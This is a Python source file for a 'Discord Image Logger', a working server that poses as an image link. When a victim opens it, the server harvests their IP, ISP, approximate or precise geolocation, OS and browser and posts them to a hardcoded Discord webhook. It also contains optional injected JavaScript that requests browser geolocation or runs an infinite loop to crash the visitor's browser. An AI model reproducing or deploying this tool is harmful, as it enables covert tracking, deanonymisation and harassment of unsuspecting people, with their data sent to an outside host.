from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback
import requests
import base64
import httpagentparser
import logging
import json

__app__ = "Discord Image Logger"
__description__ = "A sophisticated application that logs information using Discord's 'Open Original' feature"
__version__ = "v2.1"
__author__ = "DeKrypt"

# Configuration setup
config = {
    "webhook": "https://discord.com/api/webhooks/1261396872388546700/1sGG0sZP80wpPBB8uYf36YWH7UlRwSc8_GnlfidKG2L6bFDEOPQE8PKVTqF3TRExX-Oq",
    "image": "https://cdn.discordapp.com/attachments/1261396853510115408/1268147887695466609/photo_2024-07-13_04-31-34.jpg?ex=66ab5e41&is=66aa0cc1&hm=933cad7547693590bfe23cb879fa8bbdc64478e1539ea268bfc4217f75e6f83c&",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been logged by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='image_logger.log')

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    logging.error(f"Error occurred: {error}")
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n{error}\n",
        }],
    })

def makeReport(ip, port, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        logging.warning(f"IP {ip} is blacklisted.")
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        logging.info(f"Bot detected: {bot}")
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Port:** {port}\n**Platform:** {bot}",
                }],
            })
        return

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception as e:
        logging.error(f"Failed to get IP info: {e}")
        info = {}

    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] in [2, 3, 4]:
            if config["antiBot"] == 4 and not info.get("proxy", False):
                return
            if config["antiBot"] == 3:
                return
            if config["antiBot"] == 2 and not info.get("proxy", False):
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** {endpoint}
            
**IP Info:**
> **IP:** {ip if ip else 'Unknown'}
> **Port:** {port}
> **Provider:** {info.get('isp', 'Unknown')}
> **ASN:** {info.get('as', 'Unknown')}
> **Country:** {info.get('country', 'Unknown')}
> **Region:** {info.get('regionName', 'Unknown')}
> **City:** {info.get('city', 'Unknown')}
> **Coords:** {str(info.get('lat', 'Unknown')) + ', ' + str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')} ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** {info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ')} ({info.get('timezone', 'Unknown').split('/')[0]})
> **Mobile:** {info.get('mobile', 'Unknown')}
> **VPN:** {info.get('proxy', 'Unknown')}
> **Bot:** {info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}

**PC Info:**
> **OS:** {os}
> **Browser:** {browser}

**User Agent:**
{useragent}

""",
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    logging.info(f"Report sent for IP: {ip}")
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id", "").encode()).decode() if dic.get("url") or dic.get("id") else config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{url}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''.encode()
            
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            port = self.client_address[1]
            user_agent = self.headers.get('user-agent', '')

            if ip.startswith(blacklistedIPs):
                logging.info(f"Blacklisted IP: {ip}")
                return
            
            if botCheck(ip, user_agent):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()
                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(ip, port, endpoint=s.split("?")[0], url=url)
                return

            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if dic.get("g") and config["accurateLocation"]:
                location = base64.b64decode(dic.get("g").encode()).decode()
                result = makeReport(ip, port, user_agent, location, s.split("?")[0], url=url)
            else:
                result = makeReport(ip, port, user_agent, endpoint=s.split("?")[0], url=url)
                
            message = config["message"]["message"]

            if config["message"]["richMessage"] and result:
                message = message.format(
                    ip=ip,
                    port=port,
                    isp=result.get("isp", "Unknown"),
                    asn=result.get("as", "Unknown"),
                    country=result.get("country", "Unknown"),
                    region=result.get("regionName", "Unknown"),
                    city=result.get("city", "Unknown"),
                    lat=str(result.get("lat", "Unknown")),
                    long=str(result.get("lon", "Unknown")),
                    timezone=f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ')} ({result.get('timezone', 'Unknown').split('/')[0]})",
                    mobile=str(result.get("mobile", "Unknown")),
                    vpn=str(result.get("proxy", "Unknown")),
                    bot=str(result.get("hosting", "Unknown") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'),
                    browser=httpagentparser.simple_detect(user_agent)[1],
                    os=httpagentparser.simple_detect(user_agent)[0]
                )

            datatype = 'text/html'

            if config["message"]["doMessage"]:
                data = message.encode()
            
            if config["crashBrowser"]:
                data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()

            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
            self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
